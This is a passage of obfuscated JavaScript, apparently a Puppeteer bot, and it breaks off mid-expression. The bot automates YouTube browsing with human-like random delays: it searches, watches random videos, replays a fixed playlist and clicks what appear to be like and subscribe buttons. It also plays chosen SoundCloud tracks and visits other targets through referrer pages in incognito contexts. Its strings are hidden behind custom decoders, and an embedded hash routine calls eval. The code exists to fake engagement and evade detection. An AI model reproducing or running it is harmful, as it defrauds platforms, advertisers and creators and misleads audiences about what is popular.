const W = c,
  V = b,
  U = d;

function a() {
  const bp = [
    'craft,mine',
    'W77dQ8koWPu8sctdJ8ksWPe',
    'hGOOW6q',
    'W55hwmofuhvlrSknW4K',
    'WQPUW44QgWhdOIBcQLu',
    'lCkyWQrzw2JdJmkYW6zq',
    'CMCVzw4VC2nYAq',
    'to-build-a',
    'W69BF8oQsZFcQ8kqW6xcUW',
    'ChrZlZm1ndy2lq',
    'ze_YT_To_W',
    'BwvSAwGXotmVCG',
    'WRD7W6G',
    'z29PBMCGDg8GzG',
    'ChrZlZq0odyWmq',
    'ChrZl2j5lxnPDa',
    'zwfZEwzVCMSUBW',
    'newPage',
    'e/youtube.',
    'jfzNWOXGWOdcLSowW5/cMG',
    'Firefox',
    'none',
    'w.youtube.',
    'p1rBW5iIWPK7W4tcNtW',
    'CMCVC2nYAxb0CW',
    'lte4zgzHnMq2zq',
    'jNjREs7ODT',
    'W6/dHKBdMYGJFSo1dqe',
    'easyfork.o',
    'DhjHAwXLCNm',
    'o\x20healers,',
    'y29Tp3bHz2u9oq'
  ];
  a = function() {
    return bp;
  };
  return a();
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xa5b + -0x1 * -0xa1d + 0x3f))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xd91 + 0x257b + 0x1 * -0x17ea), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x58a2 + -0x765e + 0x92ec + (0x1d1 * -0x4 + 0x5dfe + 0xd * -0x22a) * random()) : await standardWaitForNetIdle(f), await wait(0x5bc + -0x58e + -0x1 * -0x135a + (-0x349a + -0x81 * -0x79 + -0x9 * -0x369) * random()), -0x1 * -0x21fa + -0x1aed + 0x386 * -0x2;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xebc + -0x132c + 0x17f8), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x4a * 0x29 + -0x2592 + 0x316d;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x39 * 0xa3 + -0x22e + -0xd5 * 0x29);
    let h = e[f];
    if (b['JHGgTN'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1512 + -0x1 * -0xc41 + 0x8d1, s, t, u = -0xffe + 0xc60 + 0x39e; t = n['charAt'](u++); ~t && (s = r % (-0xa5b + -0x1 * -0xa1d + 0x42) ? s * (-0xd91 + 0x257b + 0x2 * -0xbd5) + t : t, r++ % (0xec6 + -0x13bb + 0x4f9)) ? p += String['fromCharCode'](0x136 * -0x2 + 0x1f55 + 0x9 * -0x31a & s >> (-(0x5bc + -0x58e + -0x2 * 0x16) * r & -0x1a4d + -0xdf * -0x23 + -0x2 * 0x215)) : -0x1 * -0x21fa + -0x1aed + 0x70d * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0xebc + -0x132c + 0x470, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x4a * 0x29 + -0x2592 + 0x317c))['slice'](-(0x683 + -0x1bcf + 0x154e));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1523 + 0x1 * 0x226f + -0x3792,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x333 * -0x2 + 0x7d4 + -0x16e; u < 0xf65 + 0x1807 + -0x4 * 0x99b; u++) {
          p[u] = u;
        }
        for (u = 0xc77 * -0x1 + 0xcdb + -0x64; u < -0x53 * -0x3b + 0xd05 + -0x1bb * 0x12; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2f * 0x17 + -0x3 * 0x529 + 0x424 * 0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xd * 0x2b1 + -0x11 * 0x132 + 0x374f, q = 0xb7d * 0x2 + 0x23b8 + -0x3ab2;
        for (let v = 0xb9c + 0x195d + -0x24f9; v < n['length']; v++) {
          u = (u + (0xb1 * 0x2 + 0x13 * -0x72 + 0x715)) % (0x1e6e + 0x161d * -0x1 + -0x751 * 0x1), q = (q + p[u]) % (0xb8 * 0x1d + -0x7bf * 0x3 + 0x4f * 0xb), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1c1 * 0x13 + -0x4c7 * 0x7 + 0x43c4)]);
        }
        return t;
      };
      b['ilUERG'] = m, c = arguments, b['JHGgTN'] = !![];
    }
    const j = e[0x583 * 0x6 + 0xb * -0x8e + 0x1af8 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['zBgtBL'] === undefined && (b['zBgtBL'] = !![]), h = b['ilUERG'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(0x683 + -0x1bcf + 0x28d4 + (0x1523 + 0x1 * 0x226f + -0x240a) * random()), 0x333 * -0x2 + 0x7d4 + -0x16d;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + R(0x13, 'i3)T') + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xf65 + 0x1807 + -0x3a * 0xae, 0xc77 * -0x1 + 0xcdb + -0x5d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x72c7 * -0x2 + 0x9c3c + -0x4bb5 * 0x2) * getRandomInt(-0x2f * 0x17 + -0x3 * 0x529 + 0x692 * 0x3, -0xd * 0x2b1 + -0x11 * 0x132 + 0x3754), h)), 0xb7d * 0x2 + 0x23b8 + -0x3ab1;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x39 * 0xa3 + -0x22e + -0xd5 * 0x29);
    let h = e[f];
    if (c['OELOIX'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1512 + -0x1 * -0xc41 + 0x8d1, r, s, t = -0xffe + 0xc60 + 0x39e; s = m['charAt'](t++); ~s && (r = q % (-0xa5b + -0x1 * -0xa1d + 0x42) ? r * (-0xd91 + 0x257b + 0x2 * -0xbd5) + s : s, q++ % (0xec6 + -0x13bb + 0x4f9)) ? o += String['fromCharCode'](0x136 * -0x2 + 0x1f55 + 0x9 * -0x31a & r >> (-(0x5bc + -0x58e + -0x2 * 0x16) * q & -0x1a4d + -0xdf * -0x23 + -0x2 * 0x215)) : -0x1 * -0x21fa + -0x1aed + 0x70d * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0xebc + -0x132c + 0x470, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x4a * 0x29 + -0x2592 + 0x317c))['slice'](-(0x683 + -0x1bcf + 0x154e));
        }
        return decodeURIComponent(p);
      };
      c['pRnaaY'] = i, b = arguments, c['OELOIX'] = !![];
    }
    const j = e[0x1523 + 0x1 * 0x226f + -0x3792],
      k = f + j,
      l = b[k];
    return !l ? (h = c['pRnaaY'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xb9c + 0x195d + -0x24f9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xb1 * 0x2 + 0x13 * -0x72 + 0x715]['split']('\x20');
    for (let k = 0x1e6e + 0x161d * -0x1 + -0x851 * 0x1; k < i['length']; k += 0xb8 * 0x1d + -0x7bf * 0x3 + 0x29 * 0xf)
      j += i[k] * h[i[k + (-0x1c1 * 0x13 + -0x4c7 * 0x7 + 0x42c5)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x583 * 0x6 + 0xb * -0x8e + 0x1af2 * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x1876 + -0x5b * 0x3b + 0x2d70)['map'](l => l['childNodes'][-0x1302 + 0x101 * 0x11 + 0xa6 * 0x3]['childNodes'][0x5 * -0x55f + -0x1a50 + 0x352b]['childNodes'][0x561 + 0x2367 + 0x28c7 * -0x1]['childNodes'][0x61a + 0x401 + -0xc7 * 0xd]['childNodes'][-0x197f * 0x1 + -0x197d + -0x39 * -0xe5]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x6 * -0x161 + 0x11cf + 0xb * -0x83, 0x26f6 * 0x1 + -0xf * 0x137 + -0x67 * 0x3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x22ca + -0x4f9c + 0x676a);
  const h = await getMaxTime(f),
    i = Math['min']((0xf0c1 * -0x1 + 0x1b01c + 0x2b05) * getRandomInt(0x34c * 0x2 + -0x17f7 + 0x1161, -0x47 * 0xd + -0x2000 * -0x1 + -0x1c60), h);
  return await wait(i), 0x1722 + 0xdb7 * -0x2 + 0x44d;
}
async function frontScreenActions(f) {
  const S = c;
  return log(S(0xd) + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1962 + 0x1 * 0x9dd + 0xf85]['children'][-0x1d42 + 0x78b * -0x1 + 0x24cd * 0x1]['children'][-0x89 * -0x6 + -0x135f + 0x1029]['children'][-0x7f * -0x7 + -0x5 * 0x13d + 0x2b8]['children'][0x1 * -0x1c0f + 0x20 * 0xd7 + 0x12f]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0xae0 + 0x2109 + -0x1628;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xe * 0x1cf + -0x1aad * 0x1 + 0x1bf + (-0x15db + -0x2 * 0xbc3 + -0xf31 * -0x3) * random()
  }), await wait(-0x1b * -0x41 + -0xda8 + -0x53 * -0x1b + (0x1 * -0x1b + -0x1 * -0x1fd3 + -0x1e8c) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1fe * -0x5 + 0xc9 * 0x3 + 0x79d]['childNodes'][-0x1127 + 0x1 * 0x1a8d + -0x965]['childNodes'][0x528 + -0x1 * 0x58a + 0x63]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x470 * -0x1 + -0x1390 * 0x1 + 0xf25 * 0x1]['childNodes'][0x22f * 0xe + 0x2 * 0x1046 + -0x3f1e]['childNodes'][-0x1 * -0x164f + 0x5 * -0x36e + 0x1 * -0x527]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x20f2 + 0x1751 + 0x112 * 0x9),
          r = -0xaf3 + 0x2 * 0x11b6 + -0x1879;
        for (let u = 0x252c + 0x680 * 0x4 + 0x4 * -0xfcb; u < q['length']; u += -0x171f + -0x67d + -0xecf * -0x2)
          r += q[u] * k[q[u + (-0xbbb + 0x1790 + -0xbd4)]];
        return r;
      }(n);
  });
  await wait((0x8 * -0x6fe + -0x15ed + 0x8875 * 0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x15 * 0x560 + -0xaa92 + 0x205d2 * 0x1) * getRandomInt(-0x1208 + 0x232d + 0x892 * -0x2, -0x58 + 0x220f + 0x21ad * -0x1), h + (0x242a + 0x11c9 + 0x226b * -0x1));
  return await wait(i), 0x1f8b + -0x13a + -0x1e50;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1c53 + -0x628 + 0x227b), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xb * -0x183 + -0x36 * -0xb5 + -0x9d5 + (-0x2bf + -0x1 * -0x6d9 + -0x32) * Math['random']());
    });
  }, 0x65 * -0x46 + 0x1 * 0x3665 + -0x1d * -0x5);
  await wait(0x1 * 0x405f1 + 0x10241 * -0x3 + 0x1 * 0x394b2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x84d2 * 0x1 + 0x1 * -0x326b + 0x1a19d) * getRandomInt(0x9f3 * -0x1 + -0x4bd * -0x3 + -0x440, 0x27 * 0x8 + 0xbf8 + -0xd17)), clearInterval(h), 0xc88 + -0x1d93 * -0x1 + -0x2a1a * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x159b + 0x71 * -0xb + -0x10c0;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0x1d3 + -0x8ff + -0xb * -0xa7;
    await randomWait();
  }
  return -0x4b * 0x13 + -0x2fb * 0xc + 0x2956;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1f59 + 0x26f7 + 0x41 * -0x1e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x4ed + -0x92 * 0x13 + -0x5e9 * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xd0c + 0xbe * 0x32 + -0x1810 + 0.3) {
      const j = await f[T(0x1, 'Oo](') + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x89 * 0x35 + -0x71 * 0x1d + 0x292a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x4f * -0x35f + -0xda * 0xb5 + -0x43 * -0xf3 + getRandomInt(0x8 * -0xb57 + 0x6c * -0x6d + 0x74 * 0x1af, -0x88a1 + 0x294c + 0x5 * 0x2a81));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2 * 0xa5b + 0x2418 + -0xf61), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x82 * -0x3d + -0xa13 * 0x1 + 0x290d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x9c9 + 0x191b + -0x22e4, -0x1f * 0x8f + -0x4c0 + 0x1643)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2 * -0x39b + 0x4cf * 0x6 + -0xdd4 + floor((-0xfaf + 0xac1 + 0x8d6) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x9d8bb4ba + 0x8f7ebf4 + -0x2683a0ae),
          -0x76 * 0xbb9d + -0x8996ad + 0x160110b,
          0x1 * 0xd757 + -0xd909 * 0x1 + -0x1 * -0x81b2,
          -0x651 * 0x1 + 0xad * -0x4 + -0x985 * -0x1
        ], y = [
          0x5 * 0x638 + -0xe88 + -0x7c * 0x22,
          0xb22 + 0x1d72 * 0x1 + 0xa21 * -0x4,
          0x12bd + -0x6ce + -0x115 * 0xb,
          -0x219d + 0x2 * -0x1210 + 0x45bd
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x4b1 * 0x1 + -0x3 * -0x807 + -0x1cc5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2175 + 0x304 * 0x9 + -0xb * -0x93; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1 * 0x1e3 + 0x1 * -0x13d5 + 0x15b8) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2 * -0x5a1 + 0x763 + 0x3df] = A[-0x767 * -0x2 + -0x9 * -0x2bd + -0x2763] = A[0xb6c + -0xa31 * -0x3 + -0x2b * 0xfa] = A[-0x281 * -0x2 + 0xf1a + -0x1 * 0x141a] = A[0x1f49 + -0x9f8 + -0x154e] = A[-0xb40 + 0xe9e + -0x35a] = A[0x7fa + -0x695 + -0x4 * 0x58] = A[-0xaf1 + 0x1 * 0x220d + -0x1716] = A[-0x14ff + 0x25c3 + 0x5 * -0x359] = A[-0x20ad + -0x240f + 0x44c4] = A[-0x6f1 + -0xd * 0x92 + 0xe64] = A[-0xb5 * -0x17 + -0x1 * -0xa48 + -0x1a81] = A[-0x2465 + 0x145f + 0x1011] = A[0x19e2 + 0x8b1 + -0x2287] = A[-0x1 * 0x1fdd + -0x3 * -0x517 + 0x10a5 * 0x1] = A[-0x2144 + 0x4a4 + -0x1cae * -0x1] = A[0xc59 * -0x1 + -0xe * -0x109 + -0x216] = -0xe7f + -0x219b * -0x1 + 0x4 * -0x4c7, this['blocks'] = A) : this['blocks'] = [
                0x1b3c + 0x10ba + -0x15fb * 0x2,
                0x1169 + 0x1a48 + 0x5 * -0x8bd,
                0x17b1 + 0x3e6 + -0x1b97,
                -0x1 * -0x2171 + -0x1 * -0x1ea7 + -0x4018,
                0x191 * -0x1 + -0xe2f + 0xfc0,
                0x3a * 0x6f + -0x3c7 * 0x1 + -0x155f,
                0x184e + 0x1722 + 0x18 * -0x1fa,
                -0x1 * -0xa31 + -0x1d55 + -0x4 * -0x4c9,
                -0x13c6 + -0x26e + 0x1634,
                -0x379 + 0xe4d + -0xad4,
                0x1a59 + -0xec1 + 0x1c * -0x6a,
                0x614 + 0x1 * -0x20e3 + 0x1 * 0x1acf,
                -0x1 * 0x2193 + -0x1ffd + 0x4190,
                0x22c + -0x128 + -0x104,
                0x576 + -0xfa1 * 0x2 + -0xd * -0x1fc,
                0x1 * -0x2f5 + 0x1858 + -0x1563,
                -0x48 * -0x25 + 0x1 * 0xc9d + 0x53 * -0x47
              ], this['h0'] = 0x4c1f351 + -0x492 * -0x2a6c77 + -0x5f60882e, this['h1'] = -0x17 * -0x3fab3b9 + 0xb * -0x1f42fc03 + 0x1ec285a0b, this['h2'] = 0x86d3d633 + -0x8dda88ef * 0x1 + 0xc96 * 0xcb177, this['h3'] = -0x1f9cefd2 + -0x311 * -0x167f5 + -0x2d2b * -0xf689, this['h4'] = -0x169743269 + 0x139d1a2a8 + 0xf37571b1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x635 + -0x40 * 0x7f + 0x25f5, this['finalized'] = this['hashed'] = 0x1 * 0x198b + 0x77 * 0x1d + 0x4a * -0x87, this['first'] = 0x266d + -0xde6 + 0x2b * -0x92;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x24a9 + -0x1cf1 + 0x419a, O = J['length'] || 0x1 * 0x2377 + -0x3b * 0x49 + -0x12a4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x24e * -0x1 + -0xe3 * -0x29 + -0x26a9 * 0x1, P[0x86 * 0x2f + 0x1008 + 0x28a2 * -0x1] = this['block'], P[-0x113e + -0x198b + 0x2ad9] = P[0xa4 * -0x30 + 0x1 * 0xa49 + -0x28f * -0x8] = P[0x3 * -0x361 + 0x40 * 0x86 + -0x1 * 0x175b] = P[0x2a5 * 0x1 + 0x1e28 + -0x1 * 0x20ca] = P[-0x1f34 + -0x1521 + 0x3459] = P[0x1 * -0x2596 + 0x3 * 0xb3f + -0x3de * -0x1] = P[0x13bc + 0x1a5d + 0x937 * -0x5] = P[-0x180e + 0x10a2 * 0x1 + 0x773 * 0x1] = P[0x9 * -0x263 + -0xf38 + -0x1 * -0x24bb] = P[0x2588 + -0x34 * 0x1d + -0x1f9b] = P[-0x1 * 0x2331 + -0xae + 0x23e9] = P[-0x2 * 0x4c9 + 0xa * 0x78 + 0xd * 0x61] = P[0x1007 + 0x20c1 + 0x2 * -0x185e] = P[0x3 * -0xb60 + 0x2b * 0x1f + -0x67 * -0x48] = P[0x2448 + -0xf4b + -0x14ef] = P[-0x1 * 0xc9d + 0x1f3b + -0x128f] = 0x4f3 * -0x5 + -0x1683 + 0x20e * 0x17), K) {
                    for (N = this['start']; M < O && N < 0x10 * 0x235 + -0x10 * 0x1d5 + -0x5c0; ++M)
                      P[N >> -0x1 * 0x7c3 + -0x734 + -0xef9 * -0x1] |= J[M] << y[-0x193 + -0x191c + 0x1ab2 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1140 + -0xd6 * -0x11 + -0x22 * 0xeb; ++M)
                      (L = J['charCodeAt'](M)) < -0x1aa4 + -0x3ca + 0x1eee ? P[N >> 0xfc9 + 0x100b + -0x1fd2] |= L << y[0x1774 + 0xe * -0x218 + -0x5df * -0x1 & N++] : L < 0x418 + 0x1f68 + -0x1b80 ? (P[N >> 0x1ddc + -0x31a * -0x2 + -0x240e] |= (-0x1bf4 + 0x8d2 + -0x13e2 * -0x1 | L >> -0xa7e + -0x3d * 0x43 + 0x1a7b) << y[0xbc9 * -0x1 + 0xfaa + 0x9 * -0x6e & N++], P[N >> -0x1116 + -0x1 * 0x1e39 + 0x2f51] |= (0x2fe * -0x9 + -0x132d + 0xf89 * 0x3 | 0x1dad + 0x6e * -0x47 + 0x6 * 0x2e & L) << y[0xfce + 0x264d + 0x3618 * -0x1 & N++]) : L < 0x1 * 0x1a66f + 0x8700 + -0x1556f * 0x1 || L >= 0x2 * -0x869a + -0x2e9 * 0x34 + -0x14 * -0x203a ? (P[N >> -0x220f * -0x1 + -0x1 * -0x16a6 + 0xb57 * -0x5] |= (-0x51c + 0x1e07 * -0x1 + 0x3 * 0xc01 | L >> -0x81a + -0x1fa6 + -0x9f3 * -0x4) << y[-0xd * -0x119 + -0xde * 0x24 + 0x1 * 0x10f6 & N++], P[N >> -0x19f5 + -0x3bc * -0x1 + -0x7 * -0x32d] |= (0x15eb + 0xace + -0x2039 | L >> -0x211 * -0xd + -0x88 * 0x1e + -0x1 * 0xae7 & 0x195 + -0x1 * -0x443 + -0x599) << y[0x5e1 * -0x1 + -0x2b * 0x4c + 0x12a8 & N++], P[N >> 0xfed + 0x159 * 0x13 + -0x2986] |= (0x2b * 0x29 + -0x6da + 0x11 * 0x7 | 0x5cc * -0x4 + -0x1 * 0xb9 + 0x1828 & L) << y[-0x3d5 + -0x1 * -0x1afa + -0x1722 & N++]) : (L = -0x1 * 0x128d5 + -0x3199 * 0x5 + 0x320d2 + ((0x37 * -0x33 + -0x27b * 0xe + 0x31ae & L) << 0x3cb + 0x215d + -0x1 * 0x251e | -0x2b * -0x73 + -0x1247 + 0x1 * 0x2f5 & J['charCodeAt'](++M)), P[N >> -0x9dd + 0x74 * 0x56 + -0x1d19] |= (-0x270a + 0x21f4 + 0x202 * 0x3 | L >> 0x1 * -0x1457 + -0x531 + -0x1 * -0x199a) << y[-0x59d + -0x1 * -0x1d66 + 0xb3 * -0x22 & N++], P[N >> -0xa3d * -0x1 + 0x87 * 0x23 + -0x1cb0] |= (0x814 + -0x13 * 0x128 + -0x732 * -0x2 | L >> 0x147f + 0x2e8 * 